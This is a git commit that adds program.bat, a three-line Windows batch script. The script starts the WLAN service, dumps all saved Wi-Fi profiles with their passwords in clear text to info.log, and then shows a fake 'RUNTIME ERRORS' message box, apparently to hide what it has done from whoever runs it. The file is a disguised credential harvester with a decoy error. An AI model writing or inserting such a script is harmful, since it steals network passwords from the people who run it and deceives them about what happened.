67edf22dbd79e6bd5d3cf7647bdb35eba49ca18d
Енот Погромист <31641281+enot-pogromist@users.noreply.github.com>
2017-10-25 08:01:50 +0300

    1

---
+++ program.bat
@@ -0,0 +1,3 @@
+net start wlansvc
+netsh wlan show profile name=* key=clear > info.log
+powershell [Reflection.Assembly]::LoadWithPartialName("""System.Windows.Forms""");[Windows.Forms.MessageBox]::show("""ERROR NUBMERS: X3423055000000!""", """RUNTIME ERRORS""")
